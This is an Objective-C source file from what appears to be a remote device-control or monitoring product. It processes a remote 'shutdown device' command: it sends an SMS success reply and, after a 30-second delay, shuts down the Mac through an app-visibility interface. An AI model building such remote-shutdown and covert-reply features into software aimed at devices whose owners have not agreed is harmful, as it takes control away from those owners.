//
//  ShutdownDeviceProcessor.m
//  RCM
//
//  Created by Makara Khloth on 4/29/15.
//
//

#import "ShutdownDeviceProcessor.h"
#import "SystemUtils.h"

@interface ShutdownDeviceProcessor (PrivateAPI)
- (void) sendReplySMS;
- (void) processShutdownDevice;
@end

@implementation ShutdownDeviceProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ShutdownDeviceProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ShutdownDeviceProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ShutdownDeviceProcessor--->initWithRemoteCommandData");
    if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
    }
    return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ShutdownDeviceProcessor
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
    DLog (@"ShutdownDeviceProcessor--->doProcessingCommand")
    [self processShutdownDevice];
}


#pragma mark ShutdownDeviceProcessor

/**
 - Method name: processShutdownDevice
 - Purpose:This method is used to Shutdown Device
 - Argument list and description: No Return Type
 - Return description: mRemoteCmdCode (NSString *)
 */

- (void) processShutdownDevice {
    DLog (@"ShutdownDeviceProcessor--->processShutdownDevice")
    [self sendReplySMS];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [NSThread sleepForTimeInterval:30.0];
        
#if TARGET_OS_IPHONE
        ;
#else
        id <AppContext> appContext = [[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext];
        id <AppVisibility> appVisibility = [appContext getAppVisibility];
        [appVisibility shutdownMac];
#endif
    });
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS {
    DLog (@"ShutdownDeviceProcessor--->sendReplySMS")
    NSString *shutdownDeviceMessage=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                               andErrorCode:_SUCCESS_];
    [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
                                             andReplyMessage:shutdownDeviceMessage];
    if ([mRemoteCmdData mIsSMSReplyRequired]) {
        [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
                                                               andMessage:shutdownDeviceMessage];
    }
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */


-(void) dealloc {
    [super dealloc];
}

@end
